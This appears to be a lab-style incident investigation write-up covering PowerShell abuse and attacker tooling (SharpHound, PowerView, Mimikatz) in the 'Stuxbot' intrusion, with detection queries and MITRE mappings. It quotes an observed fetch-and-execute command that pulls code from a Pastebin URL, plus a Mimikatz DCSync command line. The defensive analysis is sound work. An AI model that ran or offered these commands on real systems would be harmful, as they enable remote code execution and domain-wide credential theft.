# 02 – PowerShell and Attacker Tooling

## Executive Summary

PowerShell played a central role throughout the Stuxbot intrusion. Following execution of the malicious OneNote document, the attacker leveraged PowerShell to retrieve remote payloads, execute code directly in memory, establish command-and-control communications, and deploy post-exploitation tooling.

Analysis of Windows Sysmon telemetry and PowerShell Script Block Logging also revealed the deployment of several well-known offensive security tools, including **SharpHound**, **PowerView**, and **Mimikatz**.

Together, these artifacts provide high-confidence evidence of deliberate attacker activity targeting the Active Directory environment.

---

# Investigation Objectives

The objectives of this phase were to:

- Investigate PowerShell execution.
- Identify remote payload retrieval techniques.
- Analyze attacker PowerShell commands.
- Identify offensive security tools deployed during post-exploitation.
- Document PowerShell-based Indicators of Compromise.
- Develop reusable detection opportunities.

---

# PowerShell Execution

PowerShell was executed shortly after `invoice.bat` was launched from Microsoft OneNote.

The command line revealed a classic download-and-execute pattern using publicly accessible infrastructure.

## Investigation Query

```text
process.name:"powershell.exe"
```

---

## Figure 1

*PowerShell execution observed following the malicious batch file.*

![Figure 1](figures/figure_1_powershell_execution.png)

---

# Remote Payload Retrieval

Analysis of the PowerShell command line revealed that the attacker retrieved content directly from **Pastebin**.

Observed command:

```powershell
iex (iwr https://pastebin.com/raw/33Z1jP6J)
```

This technique combines:

- Invoke-WebRequest (IWR)
- Invoke-Expression (IEX)

allowing remote code to be downloaded and executed entirely in memory.

This behavior significantly reduces forensic artifacts left on disk.

---

## Detection Opportunities

The following command-line patterns should be considered highly suspicious:

```text
Invoke-WebRequest

Invoke-Expression

DownloadString

Net.WebClient

Start-BitsTransfer
```

Common detection queries include:

```text
process.command_line:*Invoke-WebRequest*
```

```text
process.command_line:*DownloadString*
```

```text
process.command_line:*iex*
```

---

## Figure 2

*PowerShell retrieving a remote payload from Pastebin.*

![Figure 2](figures/figure_2_pastebin_payload.png)

---

# Encoded PowerShell

Attackers frequently encode PowerShell commands to evade signature-based detections.

Typical indicators include:

```text
-enc

-EncodedCommand

FromBase64String
```

Recommended hunting query:

```text
process.command_line:*-enc*
```

---

# PowerShell Script Block Logging

Script Block Logging provides visibility into PowerShell code executed in memory, even when commands are heavily obfuscated.

Unlike process creation events, Script Block Logging records the actual script content executed by PowerShell.

During the investigation, Script Block Logging exposed PowerView reconnaissance commands executed against the Active Directory environment.

Investigation query:

```text
powershell.file.script_block_text:*share*
```

---

## Figure 3

*PowerView functions recovered through PowerShell Script Block Logging.*

![Figure 3](figures/figure_3_powerview_scriptblock.png)

---

# Offensive Tooling Identified

Multiple offensive security tools were recovered during the investigation.

| Tool | Purpose |
|------|---------|
| SharpHound | Active Directory enumeration |
| PowerView | PowerShell reconnaissance |
| Mimikatz | Credential theft |
| default.exe | Primary malware payload |

The simultaneous appearance of these tools indicates a mature post-exploitation workflow rather than opportunistic malware execution.

---

# SharpHound

SharpHound is the data collection component of the BloodHound framework.

Observed activities include:

- Account Discovery
- Group Enumeration
- Session Enumeration
- Local Administrator Discovery
- Trust Enumeration

MITRE ATT&CK

- T1087 — Account Discovery
- T1069 — Permission Group Discovery

---

## Figure 4

*SharpHound execution observed during post-exploitation.*

![Figure 4](figures/figure_4_sharphound_execution.png)

---

# Mimikatz

Mimikatz was executed following Active Directory reconnaissance.

Process arguments revealed:

```text
lsadump::dcsync /domain:eagle.local /all /csv exit
```

This indicates an attempted **DCSync** operation rather than local credential dumping.

Detection query:

```text
process.name:"mimikatz.exe"
```

Additional hunting queries:

```text
process.command_line:*lsadump*
```

```text
process.command_line:*dcsync*
```

---

## Figure 5

*Mimikatz execution and DCSync process arguments.*

![Figure 5](figures/figure_5_mimikatz_dcsync.png)

---

# PowerShell Indicators of Compromise

Observed PowerShell behaviors included:

- Remote payload retrieval
- In-memory execution
- Script Block Logging artifacts
- Active Directory reconnaissance
- Credential theft preparation

These behaviors collectively provide high-confidence indicators of malicious activity.

---

# Detection Opportunities

Recommended monitoring includes:

### High Severity

- Mimikatz execution
- PowerView execution
- SharpHound execution
- PowerShell using Invoke-Expression
- PowerShell downloading remote content

### Medium Severity

- Encoded PowerShell
- PowerShell launched from Microsoft Office
- Script Block Logging containing reconnaissance functions

### Low Severity

- Unusual PowerShell network activity
- PowerShell executed from temporary directories

---

# MITRE ATT&CK

| Tactic | Technique | ID |
|---------|-----------|----|
| Execution | PowerShell | T1059.001 |
| Discovery | Network Share Discovery | T1135 |
| Discovery | Account Discovery | T1087 |
| Discovery | Permission Group Discovery | T1069 |
| Credential Access | DCSync | T1003.006 |

---

# Phase Summary

PowerShell served as the primary execution engine throughout the Stuxbot intrusion.

Combined with Script Block Logging, Sysmon process telemetry, and command-line analysis, it was possible to reconstruct payload delivery, identify offensive tooling, and document attacker tradecraft with high confidence.

These findings provide valuable detection opportunities that can be integrated into enterprise threat hunting and detection engineering workflows.